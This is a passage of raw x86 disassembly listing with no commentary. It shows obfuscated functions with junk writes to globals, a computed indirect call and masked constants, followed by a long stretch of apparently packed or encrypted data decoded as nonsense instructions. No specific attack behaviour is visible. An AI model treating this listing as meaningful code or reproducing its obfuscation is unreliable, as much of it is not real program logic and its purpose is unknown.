  411a03:	pmaxsw mm5,QWORD PTR [esi-0x4b]
  411a07:	test   DWORD PTR [edx-0x1d],esi
  411a0a:	push   es
  411a0b:	loopne 0x411a49
  411a0d:	in     al,0x32
  411a0f:	sahf   
  411a10:	or     cl,BYTE PTR [ebp-0x42b5a0ab]
  411a16:	adc    al,0xa2
  411a18:	push   ecx
  411a19:	stos   DWORD PTR es:[edi],eax
  411a1a:	lods   al,BYTE PTR ds:[esi]
  411a1b:	loope  0x411a3b
  411a1d:	(bad)  
  411a1e:	push   DWORD PTR [ecx+0xf]
  411a21:	rol    ch,1
  411a23:	fs xor ecx,esi
  411a26:	add    ecx,edi
  411a28:	xor    edx,edx
  411a2a:	div    ecx
  411a2c:	mov    ecx,DWORD PTR [ebp-0x4]
  411a2f:	xor    ecx,esi
  411a31:	lea    eax,[ecx+eax*1+0x3272f6]
  411a38:	mov    ecx,DWORD PTR [ebp+0x8]
  411a3b:	mov    edx,DWORD PTR [ebp-0x20]
  411a3e:	mov    DWORD PTR [edx+ecx*4],eax
  411a41:	mov    eax,DWORD PTR [ebp-0xc]
  411a44:	mov    ecx,DWORD PTR [ebp+0x8]
  411a47:	xor    eax,esi
  411a49:	lea    eax,[eax+ecx*1+0x3272f6]
  411a50:	mov    DWORD PTR [ebp+0x8],eax
  411a53:	mov    eax,DWORD PTR [ebp-0xc]
  411a56:	mov    ecx,DWORD PTR [ebp+0x14]
  411a59:	xor    eax,esi
  411a5b:	add    eax,edi
  411a5d:	imul   eax,DWORD PTR [ecx]
  411a60:	mov    ecx,DWORD PTR [ebp-0x4]
  411a63:	mov    edx,DWORD PTR [ebp+0x8]
  411a66:	xor    ecx,esi
  411a68:	lea    ecx,[ecx+edx*1+0x3272f6]
  411a6f:	cmp    ecx,eax
  411a71:	jne    0x40f668
  411a77:	mov    eax,DWORD PTR [ebp-0x4]
  411a7a:	xor    eax,esi
  411a7c:	add    eax,edi
  411a7e:	mov    DWORD PTR [ebp-0x10],eax
  411a81:	mov    ebx,0x65655
  411a86:	add    ebx,0x3234
  411a8c:	xchg   ebx,esi
  411a8e:	xor    ebx,ebx
  411a90:	push   esi
  411a91:	mov    esi,ebx
  411a93:	pop    ebx
  411a94:	mov    edx,esi
  411a96:	add    ebx,0x1002
  411a9c:	lea    eax,[ebp-0x18]
  411a9f:	add    edx,eax
  411aa1:	add    edx,0x5
  411aa4:	push   edx
  411aa5:	inc    esi
  411aa6:	pop    ecx
  411aa7:	dec    ecx
  411aa8:	xchg   ecx,eax
  411aa9:	dec    eax
  411aaa:	xchg   ecx,eax
  411aab:	dec    ecx
  411aac:	xchg   ecx,edx
  411aae:	dec    edx
  411aaf:	push   edx
  411ab0:	mov    edx,ebx
  411ab2:	pop    ebx
  411ab3:	dec    ebx
  411ab4:	call   DWORD PTR [ebx]
  411ab6:	cmp    DWORD PTR [ebp+0x10],esi
  411ab9:	je     0x411ada
  411abf:	xchg   edx,eax
  411ac0:	push   0xc
  411ac2:	pop    ecx
  411ac3:	dec    ecx
  411ac4:	push   0x3
  411ac6:	pop    ebx
  411ac7:	inc    ebx
  411ac8:	xchg   ebx,ecx
  411aca:	inc    ecx
  411acb:	sub    ebx,ecx
  411acd:	xchg   ebx,ecx
  411acf:	dec    ecx
  411ad0:	dec    ecx
  411ad1:	mov    eax,DWORD PTR [ebp-0x1c]
  411ad4:	imul   eax,ecx
  411ad7:	add    esp,eax
  411ad9:	xchg   edx,eax
  411ada:	push   eax
  411adb:	xor    ebx,ebx
  411add:	mov    edx,esp
  411adf:	dec    edx
  411ae0:	inc    ebx
  411ae1:	add    ebx,DWORD PTR [edx+ebx*1]
  411ae4:	dec    ebx
  411ae5:	xor    edx,edx
  411ae7:	add    DWORD PTR [ebp-0x10],ebx
  411aea:	pop    ebx
  411aeb:	mov    eax,DWORD PTR [ebp-0x10]
  411aee:	pop    edi
  411aef:	pop    esi
  411af0:	pop    ebx
  411af1:	leave  
  411af2:	ret    0x10
  411af5:	push   ebp
  411af6:	mov    ebp,esp
  411af8:	push   ecx
  411af9:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  411b00:	mov    eax,DWORD PTR [ebp-0x4]
  411b03:	sbb    DWORD PTR ds:0x428ea7,ebx
  411b09:	mov    edx,DWORD PTR [ebp+0x10]
  411b0c:	mov    ecx,0x75108af
  411b11:	sbb    DWORD PTR ds:0x428eaf,0x428e4b
  411b1b:	xor    eax,ecx
  411b1d:	or     DWORD PTR ds:0x428e77,0x428e2b
  411b27:	add    eax,0x3272f6
  411b2c:	and    DWORD PTR ds:0x428e77,0x1e6e
  411b36:	mov    DWORD PTR [edx],eax
  411b38:	mov    eax,DWORD PTR [ebp+0xc]
  411b3b:	xor    eax,ecx
  411b3d:	or     DWORD PTR ds:0x428eab,0x179
  411b47:	push   esi
  411b48:	mov    esi,DWORD PTR [ebp+0x10]
  411b4b:	mov    edx,DWORD PTR ds:0x428ea7
  411b51:	sbb    DWORD PTR ds:0x428eaf,edx
  411b57:	mov    edx,0x3272f6
  411b5c:	xor    DWORD PTR ds:0x428eab,0x428e83
  411b66:	add    eax,edx
  411b68:	or     DWORD PTR ds:0x428e83,0x428e6f
  411b72:	mov    DWORD PTR [esi+0x4],eax
  411b75:	mov    eax,DWORD PTR [ebp+0x14]
  411b78:	movzx  esi,WORD PTR ds:0x428ecf
  411b7f:	sub    DWORD PTR ds:0x428e9b,esi
  411b85:	mov    esi,DWORD PTR [ebp+0x10]
  411b88:	adc    DWORD PTR ds:0x428e5b,0xf72
  411b92:	mov    DWORD PTR [esi+0x8],eax
  411b95:	mov    eax,DWORD PTR [ebp+0x18]
  411b98:	mov    esi,DWORD PTR [ebp+0x10]
  411b9b:	mov    DWORD PTR [esi+0xc],eax
  411b9e:	mov    eax,DWORD PTR [ebp+0x1c]
  411ba1:	mov    esi,DWORD PTR [ebp+0x10]
  411ba4:	mov    DWORD PTR [esi+0x10],eax
  411ba7:	mov    eax,DWORD PTR [ebp+0x8]
  411baa:	xor    eax,ecx
  411bac:	add    eax,edx
  411bae:	pop    esi
  411baf:	leave  
  411bb0:	ret    0x18
  411bb3:	push   ebp
  411bb4:	mov    ebp,esp
  411bb6:	sub    esp,0x9c
  411bbc:	sbb    ecx,0x4d1
  411bc2:	mov    ecx,DWORD PTR [ebp+0x8]
  411bc5:	mov    eax,0x8a9b
  411bca:	xor    ax,WORD PTR [ecx+0x20]
  411bce:	mov    ecx,DWORD PTR ds:0x428ea7
  411bd4:	adc    DWORD PTR ds:0x428e9f,ecx
  411bda:	mov    ecx,0x3b5d
  411bdf:	sub    DWORD PTR ds:0x428eab,0x1476
  411be9:	add    ax,cx
  411bec:	movzx  eax,ax
  411bef:	mov    DWORD PTR ds:0x428e8b,0x1b
  411bf9:	cmp    DWORD PTR ds:0x428e8b,0x0
  411c00:	je     0x411c4c
  411c06:	cmp    DWORD PTR ds:0x428e8b,0x2
  411c0d:	ja     0x411c4c
  411c13:	jmp    0x411c20
  411c18:	push   0x4
  411c1a:	call   DWORD PTR ds:0x42a9db
  411c20:	cmp    DWORD PTR ds:0x428e8b,0x3
  411c27:	jne    0x411c3a
  411c2d:	mov    ecx,DWORD PTR ds:0x428e8b
  411c33:	dec    ecx
  411c34:	mov    DWORD PTR ds:0x428e8b,ecx
  411c3a:	mov    ecx,DWORD PTR ds:0x428e8b
  411c40:	dec    ecx
  411c41:	mov    DWORD PTR ds:0x428e8b,ecx
  411c47:	jmp    0x411bf9
  411c4c:	mov    DWORD PTR [ebp-0x10],eax
  411c4f:	mov    BYTE PTR [ebp-0x1],0x82
  411c53:	lea    eax,[ebp-0x1]
  411c56:	or     DWORD PTR ds:0x428e33,0x2387
  411c60:	mov    DWORD PTR [ebp-0xc],eax
  411c63:	xor    DWORD PTR ds:0x428e7f,edi
  411c69:	mov    al,BYTE PTR [ebp-0x1]
  411c6c:	mov    ecx,DWORD PTR [ebp-0xc]
  411c6f:	sbb    DWORD PTR ds:0x428ebf,0x63b1
  411c79:	xor    al,0x7f
  411c7b:	sbb    DWORD PTR ds:0x428e43,0x428e93
  411c85:	add    al,0x4
  411c87:	adc    DWORD PTR ds:0x428e5b,0xd9d
  411c91:	mov    BYTE PTR [ecx],al
  411c93:	and    eax,DWORD PTR ds:0x428eaf
  411c99:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  411ca0:	push   ebx
  411ca1:	mov    ecx,DWORD PTR ds:0x428e57
  411ca7:	add    DWORD PTR ds:0x428e6f,ecx
  411cad:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  411cb4:	not    eax
  411cb6:	mov    ecx,DWORD PTR [ebp-0x18]
  411cb9:	mov    DWORD PTR ds:0x428ebf,0x1e
  411cc3:	cmp    DWORD PTR ds:0x428ebf,0x0
  411cca:	je     0x4140d3
  411cd0:	cmp    DWORD PTR ds:0x428ebf,0x3
  411cd7:	jg     0x4140d3
  411cdd:	jmp    0x411cf2
  411ce2:	push   0x428e97
  411ce7:	push   0x1953
  411cec:	call   DWORD PTR ds:0x42a9df
  411cf2:	cmp    DWORD PTR ds:0x428ebf,0x4
  411cf9:	jne    0x411d0a
  411cff:	mov    eax,ds:0x428ebf
  411d04:	dec    eax
  411d05:	mov    ds:0x428ebf,eax
  411d0a:	mov    eax,ds:0x428ebf
  411d0f:	dec    eax
  411d10:	mov    ds:0x428ebf,eax
  411d15:	jmp    0x411cc3
  411d1a:	jmp    0x4140d3
  411d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d20:	test   al,0xbe
  411d22:	cdq    
  411d23:	mov    esp,0x1c848485
  411d28:	pcmpgtw mm0,QWORD PTR [eax-0x5c0b8c]
  411d2f:	xor    DWORD PTR [ebx+0x60e78383],ecx
  411d35:	add    DWORD PTR [ebx-0x7f7c476c],0x34
  411d3c:	and    al,0xc4
  411d3e:	mov    eax,ds:0x3f149d5b
  411d43:	pop    ss
  411d44:	ficomp WORD PTR [esi-0x7c2c06b1]
  411d4a:	dec    eax
  411d4b:	das    
  411d4c:	clc    
  411d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d4e:	out    0xe,al
  411d50:	cwde   
  411d51:	fidivr DWORD PTR [ecx]
  411d53:	jmp    0x411d0b
  411d55:	dec    esp
  411d56:	les    edx,FWORD PTR [ebp+0x515c0d85]
  411d5c:	mov    dh,0xd8
  411d5e:	stos   BYTE PTR es:[edi],al
  411d5f:	add    DWORD PTR [ecx+0x6e],0x418f10f
  411d66:	rol    BYTE PTR [edi+0x6e],0xaa
  411d6a:	outs   dx,DWORD PTR ds:[esi]
  411d6b:	jbe    0x411dd6
  411d6d:	aam    0x53
  411d6f:	mov    ecx,0x83cb64d2
  411d74:	xor    DWORD PTR [eax+0x1db1360d],esi
  411d7a:	enter  0xdb63,0x0
  411d7e:	loop   0x411d6b
  411d80:	pop    ecx
  411d81:	gs jg  0x411d7e
  411d84:	test   DWORD PTR [edx],ecx
  411d86:	jo     0x411d8e
  411d88:	inc    esi
  411d89:	sbb    al,0x1
  411d8b:	fsubr  DWORD PTR [edi+0x4d]
  411d8e:	loop   0x411d87
  411d90:	popa   
  411d91:	ja     0x411d80
  411d93:	dec    BYTE PTR [edx+0x6030c872]
  411d99:	xchg   edi,eax
  411d9a:	lods   eax,DWORD PTR ds:[esi]
  411d9b:	loope  0x411d1e
  411d9d:	push   ecx
  411d9e:	fdivr  st,st(6)
  411da0:	leave  
  411da1:	xchg   DWORD PTR [eax-0xd],ecx
  411da4:	sub    BYTE PTR [eax-0x5a],bl
  411da7:	and    BYTE PTR [edi-0x7a461fcf],0x3c
  411dae:	cs xor al,0xa3
  411db1:	daa    
  411db2:	outs   dx,BYTE PTR ds:[esi]
  411db3:	cld    
  411db4:	test   cl,0x14
  411db7:	inc    esi
  411db8:	mov    WORD PTR [eax+0x21],?
  411dbb:	(bad)  [edi+0x61101be]
  411dc1:	sub    ecx,ebp
  411dc3:	enter  0xeb76,0xa3
  411dc7:	or     dh,0x2f
  411dca:	jge    0x411e03
  411dcc:	bound  esp,QWORD PTR [ecx]
  411dce:	add    ecx,DWORD PTR [edx]
  411dd0:	mov    bh,0x82
  411dd2:	cwde   
  411dd3:	cmc    
  411dd4:	pushf  
  411dd5:	and    eax,0x89075734
  411dda:	pop    ebx
  411ddb:	ss clc 
  411ddd:	aaa    
  411dde:	scas   eax,DWORD PTR es:[edi]
  411ddf:	jle    0x411d94
  411de1:	sub    DWORD PTR [ebx+edi*1-0x49],edi
  411de5:	cli    
  411de6:	jns    0x411e15
  411de8:	pop    esp
  411de9:	mov    ds:0xda398dca,al
  411def:	clc    
  411df0:	jg     0x411e38
  411df2:	jl     0x411e57
  411df4:	loope  0x411e5e
  411df6:	jae    0x411dfa
  411df8:	in     eax,0x8c
  411dfa:	jecxz  0x411e4d
  411dfc:	sbb    bl,BYTE PTR [eax]
  411dfe:	std    
  411dff:	push   edi
  411e00:	std    
  411e01:	cmp    esi,DWORD PTR [bx]
  411e04:	pop    edx
  411e05:	enter  0x2d96,0x51
  411e09:	fisub  WORD PTR [ebp-0xe10a60f]
  411e0f:	xor    dl,BYTE PTR [ebx+ebp*8]
  411e12:	lahf   
  411e13:	and    BYTE PTR [esi-0x7beafdee],ch
  411e19:	and    BYTE PTR [esi-0x23dc3dde],al
  411e1f:	xchg   edi,eax
  411e20:	cs (bad) 
  411e22:	mov    eax,ebx
  411e24:	mov    esi,0xc99a01e1
  411e29:	int3   
  411e2a:	mov    al,ds:0xd78ed3d9
  411e2f:	(bad)  
  411e30:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e32:	shl    DWORD PTR [esi+0xb],cl
  411e35:	jmp    0xbceb2e51
  411e3a:	mov    esp,0xd0585085
  411e3f:	pop    es
  411e40:	jmp    0xda2:0x57972f2a
  411e47:	jmp    0x411dcf
  411e49:	add    esp,DWORD PTR [ecx-0x717aa4d0]
  411e4f:	sahf   
  411e50:	xchg   edi,eax
  411e51:	pushf  
  411e52:	xchg   ebx,eax
  411e53:	(bad)  
  411e55:	cmp    al,BYTE PTR [edi]
  411e57:	repz daa 
  411e59:	add    BYTE PTR [esi+0x4e5878b4],0x7
  411e60:	pop    ss
  411e61:	out    0xfe,eax
  411e63:	add    eax,0x7e646b2c
  411e68:	adc    DWORD PTR [edx],edx
  411e6a:	fstp   DWORD PTR [ebx-0x275c78e7]
  411e70:	test   eax,0x1015832f
  411e75:	ins    BYTE PTR es:[edi],dx
  411e76:	(bad)  
  411e77:	loope  0x411dfc
  411e79:	stos   DWORD PTR es:[edi],eax
  411e7a:	and    edx,DWORD PTR [esi+0x21a31fd1]
  411e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e81:	inc    esi
  411e82:	sbb    al,0x91
  411e84:	call   0xd57cb529
  411e89:	mov    bl,0x2f
  411e8b:	pushf  
  411e8c:	sti    
  411e8d:	mov    ebp,0xda2c643a
  411e92:	leave  
  411e93:	push   ecx
  411e94:	call   0x650f:0x5ce11c96
  411e9b:	pop    edi
  411e9c:	in     al,0x88
  411e9e:	push   ebp
  411e9f:	mov    eax,0xe8966d3b
  411ea4:	mov    bl,0x73
  411ea6:	bound  edi,QWORD PTR [ebx+ebx*1]
  411ea9:	fwait
  411eaa:	xor    ebp,DWORD PTR [eax-0x556b90bf]
  411eb0:	mov    eax,0x2ab17318
  411eb5:	jle    0x411ee5
  411eb7:	mov    esp,0xf1a77486
  411ebc:	xor    BYTE PTR [ebx],ah
  411ebe:	adc    al,0xe3
  411ec0:	inc    ebp
  411ec1:	cwde   
  411ec2:	and    al,0xbb
  411ec4:	ins    DWORD PTR es:[edi],dx
  411ec5:	adc    bl,BYTE PTR [ebx-0x30]
  411ec8:	or     ebp,DWORD PTR [esi]
  411eca:	cmp    al,0x68
  411ecc:	cmp    ebx,DWORD PTR [eax+0x32]
  411ecf:	cdq    
  411ed0:	jns    0x411edb
  411ed2:	loope  0x411ee1
  411ed4:	aas    
  411ed5:	clc    
  411ed6:	add    BYTE PTR [edx],ch
  411ed8:	call   0x3f63901c
  411edd:	loop   0x411e78
  411edf:	ja     0x411f4b
  411ee1:	xor    al,0x7e
  411ee3:	imul   ebx,DWORD PTR [ebp-0x75a40875],0xf09799fa
  411eed:	cwde   
  411eee:	inc    edx
  411eef:	mov    edx,0x3b52e481
  411ef4:	ror    BYTE PTR [edx+0x4f44fad0],cl
  411efa:	cmp    dl,BYTE PTR [eax-0x11]
  411efd:	pop    ds
  411efe:	add    DWORD PTR [ebp-0x19],ebx
  411f01:	add    DWORD PTR [ecx],esi
  411f03:	mov    dl,0x6f
  411f05:	test   eax,0x9e2ee1da
  411f0a:	inc    eax
  411f0b:	push   ds
  411f0c:	ja     0x411f02
  411f0e:	(bad)  [edi+0x49f00d52]
  411f14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f15:	pop    eax
  411f16:	pop    ecx
  411f17:	sar    DWORD PTR [eax],1
  411f19:	call   0xf4bd16da
  411f1e:	sbb    DWORD PTR [edx+0x2e17e4fb],0xffffffd5
  411f25:	(bad)  
  411f26:	bound  esi,QWORD PTR [edi]
  411f28:	sub    cl,BYTE PTR [esp+eax*8+0x1]
  411f2c:	xor    dh,bh
  411f2e:	add    DWORD PTR cs:[ebx+0x38434e6a],0x64
  411f36:	add    BYTE PTR ds:0xd2e59280,ah
  411f3c:	lds    esi,FWORD PTR [esi]
  411f3e:	pusha  
  411f3f:	add    BYTE PTR [ebx],bl
  411f41:	jl     0x411ed7
  411f43:	mov    ch,0x34
  411f45:	ins    BYTE PTR es:[edi],dx
  411f46:	mov    ebx,0xba8e46ff
  411f4b:	test   dh,0x9e
  411f4e:	int3   
  411f4f:	mov    gs,WORD PTR [ecx+0x77c2292]
  411f55:	jge    0x411f55
  411f57:	pushf  
  411f58:	rol    DWORD PTR [edi-0x5878b64],0x1e
  411f5f:	sub    BYTE PTR [ebx+0xb],dh
  411f62:	push   eax
  411f63:	adc    ah,BYTE PTR ds:0x931cd062
  411f69:	jno    0x411fc0
  411f6b:	dec    ecx
  411f6c:	jecxz  0x411f57
  411f6e:	mov    esp,0xf06346d3
  411f73:	add    al,0x60
  411f75:	aaa    
  411f76:	xchg   DWORD PTR [edi+0x3680f60d],ecx
  411f7c:	and    bl,bh
  411f7e:	cmp    ch,BYTE PTR [eax+0x4f23cdc6]
  411f84:	jae    0x411f20
  411f86:	adc    DWORD PTR [ecx],0xffffffc0
  411f89:	fnstenv [esi]
  411f8b:	out    dx,al
  411f8c:	pop    esi
  411f8d:	mov    eax,ds:0xcc210712
  411f92:	(bad)  
  411f93:	cli    
  411f94:	fcom   st(0)
  411f96:	adc    dh,BYTE PTR [ecx+0xa]
  411f99:	iret   
  411f9a:	mov    al,ds:0x1e58741d
  411f9f:	hlt    
  411fa0:	mov    ebp,0xa178ce7b
  411fa5:	pop    edi
  411fa6:	cmc    
  411fa7:	stc    
  411fa8:	loopne 0x411fa5
  411faa:	bound  ebx,QWORD PTR [edi]
  411fac:	inc    edi
  411fad:	inc    ebp
  411fae:	jno    0x411fd6
  411fb0:	rcl    BYTE PTR [edx],1
  411fb2:	xchg   edi,edi
  411fb4:	clc    
  411fb5:	xor    BYTE PTR [eax-0x47],ah
  411fb8:	push   eax
  411fb9:	lods   eax,DWORD PTR ds:[esi]
  411fba:	(bad)  
  411fbb:	mov    cl,0x34
  411fbd:	jp     0x411fe7
  411fbf:	cmp    eax,0xae22f115
  411fc4:	mov    ecx,0xe30d2edc
  411fc9:	sbb    eax,0x7242a4d7
  411fce:	sbb    al,0xf4
  411fd0:	jno    0x411f8e
  411fd2:	shr    DWORD PTR [ebp-0x4f242c8e],0x41
  411fd9:	jae    0x411f75
  411fdb:	pop    esp
  411fdc:	and    al,0x9f
  411fde:	xchg   BYTE PTR [esi],al
  411fe0:	dec    edi
  411fe1:	push   0x2a
  411fe3:	sbb    eax,0x94c0e9b3
  411fe8:	ins    BYTE PTR es:[edi],dx
  411fe9:	cmp    BYTE PTR [esp+ecx*2-0x4a59be41],ah
  411ff0:	mov    al,0x1f
  411ff2:	xor    BYTE PTR [ecx+0x3d],cl
  411ff5:	and    al,0x66
  411ff7:	push   eax
  411ff8:	fs sbb eax,0xe7626b13
  411ffe:	xor    esi,eax
  412000:	out    dx,al
  412001:	adc    eax,0x620a7b10
  412006:	lds    ecx,FWORD PTR [esi-0x7ef3673a]
  41200c:	fdivr  DWORD PTR [esi]
  41200e:	cmp    al,0x38
  412010:	xchg   edi,eax
  412011:	stos   DWORD PTR es:[edi],eax
  412012:	cmp    ecx,ebp
  412014:	mov    al,ds:0xdba34c35
  412019:	jne    0x412098
  41201b:	mov    cl,0x68
  41201d:	bnd jmp 0x2bdbf248
  412023:	push   0xf1db44e5
  412028:	jbe    0x412091
  41202a:	dec    esi
  41202b:	fsub   QWORD PTR [eax+0x16f21e84]
  412031:	or     al,0xb5
  412033:	das    
  412034:	mov    cs,WORD PTR [ebp+eiz*1+0x61]
  412038:	enter  0xfe18,0x43
  41203c:	add    ebx,ecx
  41203e:	push   ebx
  41203f:	cmp    DWORD PTR [eax+0x7a],esp
  412042:	xor    bh,BYTE PTR [esi+edi*1]
  412045:	pop    ebp
  412046:	sbb    eax,0xc881b7c9
  41204b:	push   ebx
  41204c:	sub    eax,0xfdfda3b3
  412051:	sbb    BYTE PTR [esi+0x20],dh
  412054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412055:	adc    BYTE PTR [ebp-0x49],dl
  412058:	or     eax,0x97f11731
  41205d:	adc    BYTE PTR [ebp+0x283f5d5d],dl
  412063:	sahf   
  412064:	jmp    0x2d90:0x6a3e72f6
  41206b:	nop
  41206c:	ja     0x412083
  41206e:	push   cs
  41206f:	xchg   esi,eax
  412070:	and    ebp,DWORD PTR [ebx]
  412072:	push   0x7ce04559
  412077:	fs out dx,al
  412079:	pusha  
  41207a:	(bad)  fs:[edi+0x40]
  41207e:	pop    ebx
  41207f:	sbb    al,0x27
  412081:	test   eax,0x7fe7f461
  412087:	adc    DWORD PTR [ecx-0x266a54cb],eax
  41208d:	mov    ebx,0xb1459007
  412092:	ja     0x4120cd
  412094:	adc    al,0xd9
  412096:	cmp    DWORD PTR [edx+esi*8],ebx
  412099:	aas    
  41209a:	fsub   st,st(3)
  41209c:	sub    dh,dl
  41209e:	imul   esi,DWORD PTR [ecx*8-0x279b4341],0x12
  4120a6:	sub    al,0x8f
  4120a8:	jnp    0x4120fc
  4120aa:	sbb    bh,BYTE PTR [ecx+ecx*8+0x65]
  4120ae:	clc    
  4120af:	pop    ds
  4120b0:	lods   al,BYTE PTR ds:[esi]
  4120b1:	pop    esi
  4120b2:	(bad)
  4120b5:	js     0x412120
  4120b7:	xor    DWORD PTR [ebx+0x345b62a0],esp
  4120bd:	jmp    0x41212b
  4120bf:	sbb    bh,BYTE PTR [edi-0x170d2303]
  4120c5:	inc    ebp
  4120c6:	sti    
  4120c7:	not    BYTE PTR [ecx]
  4120c9:	push   esp
  4120ca:	fimul  WORD PTR [ecx-0x5873890c]
  4120d0:	xor    al,0x5a
  4120d2:	int    0x11
  4120d4:	ds in  eax,dx
  4120d6:	add    dl,dh
  4120d8:	arpl   bx,bp
  4120da:	sbb    cl,ah
  4120dc:	inc    ebx
  4120dd:	ins    BYTE PTR es:[edi],dx
  4120de:	out    dx,al
  4120df:	arpl   WORD PTR [ebp-0x49],di
  4120e2:	aas    
  4120e3:	add    eax,0xd8aed9f0
  4120e8:	jp     0x4120d7
  4120ea:	mov    DWORD PTR [eax],ebx
  4120ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120ed:	inc    edi
  4120ee:	dec    ebp
  4120ef:	sbb    al,0x31
  4120f1:	ins    DWORD PTR es:[edi],dx
  4120f2:	fild   DWORD PTR [ecx-0x37]
  4120f5:	sar    DWORD PTR [ebx+0x1c45496b],cl
  4120fb:	sub    DWORD PTR [ecx-0x3f],esi
  4120fe:	xchg   esp,eax
  4120ff:	(bad)  
  412100:	icebp  
  412101:	outs   dx,DWORD PTR ds:[esi]
  412102:	mov    al,ds:0xb1cf44f1
  412107:	retf   0x5155
  41210a:	retf   0x3777
  41210d:	jle    0x412107
  41210f:	xchg   ecx,eax
  412110:	mov    WORD PTR [edi+ecx*2-0x34d373fb],?
  412117:	adc    DWORD PTR [edi+0x109ffb7e],ecx
  41211d:	adc    esi,DWORD PTR [esi]
  41211f:	and    DWORD PTR [ecx+edi*8-0x77b71c61],0xffffffee
  412127:	repz (bad) 
  41212a:	cmp    al,0xe1
  41212c:	mov    ebx,0xac9473f
  412131:	push   esi
  412132:	pop    ss
  412133:	aas    
  412134:	fs dec eax
  412136:	test   DWORD PTR [eax+esi*1+0x32a9d01f],0xe4def77b
  412141:	mov    edx,0xe9320fbd
  412146:	out    dx,eax
  412147:	out    dx,eax
  412148:	mov    ebp,0x2b41155b
  41214d:	mov    dh,0x23
  41214f:	mov    dh,cl
  412151:	enter  0x3cfe,0xd3
  412155:	arpl   ax,bp
  412157:	and    BYTE PTR [eax+eax*8+0x62c7fe89],bh
  41215e:	je     0x41210b
  412160:	std    
  412161:	jne    0x4120f4
  412163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412164:	mov    ah,0xd6
  412166:	repnz in al,dx
  412168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412169:	repnz xchg ebp,eax
  41216b:	fist   WORD PTR [ecx-0x4e4817d1]
  412171:	int    0x6e
  412173:	sub    BYTE PTR [edx+0x2d],ch
  412176:	xchg   ebp,eax
  412177:	adc    eax,DWORD PTR [ebp+0x2f1b2e93]
  41217d:	xor    BYTE PTR [edi+0x57217938],ch
  412183:	sub    esp,DWORD PTR [edx+0x38]
  412186:	pop    edi
  412187:	es dec edx
  412189:	cmp    BYTE PTR [ecx-0x5a],ah
  41218c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41218d:	sahf   
  41218e:	fistp  QWORD PTR [eax-0x65b80a82]
  412194:	mov    ebx,0x2b5c3a10
  412199:	ins    BYTE PTR es:[edi],dx
  41219a:	jo     0x412122
  41219c:	cmp    al,0xf2
  41219e:	or     ebx,DWORD PTR [edi-0x6bf183fa]
  4121a4:	(bad)  
  4121a5:	jmp    0x27d6f900
  4121aa:	sbb    ebp,ebx
  4121ac:	and    DWORD PTR [eax+0x3ec6db32],0x7a488771
  4121b6:	mov    cl,0x0
  4121b8:	outs   dx,BYTE PTR ds:[esi]
  4121b9:	pop    ecx
  4121ba:	out    dx,al
  4121bb:	mov    cr4,ebp
  4121be:	and    DWORD PTR [edi],0xbe209088
  4121c4:	adc    DWORD PTR [edi-0x6d],edi
  4121c7:	sahf   
  4121c8:	mov    ah,0xf5
  4121ca:	sub    ebp,DWORD PTR [eax+0x71532962]
  4121d0:	jbe    0x412241
  4121d2:	pop    edx
  4121d3:	sti    
  4121d4:	les    edx,FWORD PTR [eax-0x4d]
  4121d7:	mov    esi,0x64e71401
  4121dc:	pop    edx
  4121dd:	aas    
  4121de:	push   esi
  4121df:	test   DWORD PTR [esi+0x7b2555e],ecx
  4121e5:	mov    ebx,0xbf9020aa
  4121ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121eb:	bound  esp,QWORD PTR [edx]
  4121ed:	out    0x57,al
  4121ef:	outs   dx,DWORD PTR ds:[esi]
  4121f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121f1:	push   ds
  4121f2:	inc    esp
  4121f3:	add    dh,bh
  4121f5:	gs mov ah,0x1b
  4121f8:	xchg   ebx,eax
  4121f9:	and    esp,DWORD PTR [eax-0x795e1d43]
  4121ff:	repz jo 0x412209
  412202:	push   ds
  412203:	(bad)  
  412204:	push   ebp
  412205:	mov    ebx,0x5da229f
  41220a:	test   eax,0x5114f353
  41220f:	or     esi,DWORD PTR [ecx+0x1aba1c02]
  412215:	adc    al,0xd1
  412217:	xchg   edx,eax
  412218:	mov    edi,0xb1247ab3
  41221d:	scas   eax,DWORD PTR es:[edi]
  41221e:	add    ebx,DWORD PTR [edx+ebx*4]
  412221:	or     cl,BYTE PTR [edx+eiz*4+0x12]
  412225:	adc    al,0xfc
  412227:	add    al,BYTE PTR [ecx+0x3d]
  41222a:	out    0x70,al
  41222c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41222d:	not    DWORD PTR [edi-0x47b5466]
  412233:	popa   
  412234:	fiadd  DWORD PTR [ebx-0x604f07ef]
  41223a:	stc    
  41223b:	dec    edi
  41223c:	das    
  41223d:	mov    ecx,0x68be010d
  412242:	pusha  
  412243:	push   eax
  412244:	add    al,0x8a
  412246:	adc    DWORD PTR [eax-0x4cbda7af],edx
  41224c:	stos   DWORD PTR es:[edi],eax
  41224d:	push   esi
  41224e:	inc    edx
  41224f:	cli    
  412250:	(bad)  
  412251:	stc    
  412252:	pop    ecx
  412253:	cmp    BYTE PTR [ebx],cl
  412255:	inc    edi
  412256:	call   0x69d1e24a
  41225b:	adc    BYTE PTR [ebp+0x6c1ca1f6],0x8d
  412262:	add    ebx,edx
  412264:	sub    ch,BYTE PTR [edi]
  412266:	jg     0x412291
  412268:	ja     0x4121f2
  41226a:	out    0x46,eax
  41226c:	mov    esp,0xe33b6b76
  412271:	xor    ah,bl
  412273:	cmp    al,0x5e
  412275:	popa   
  412276:	dec    edx
  412277:	mov    ecx,0x3609001e
  41227c:	repz pop edx
  41227e:	setb   BYTE PTR [edi]
  412281:	mov    edx,0xc71fcce1
  412286:	jle    0x412254
  412288:	aaa    
  412289:	jo     0x41220b
  41228b:	out    0x7f,al
  41228d:	pop    esi
  41228e:	cmp    al,ch
  412290:	fdiv   st,st(3)
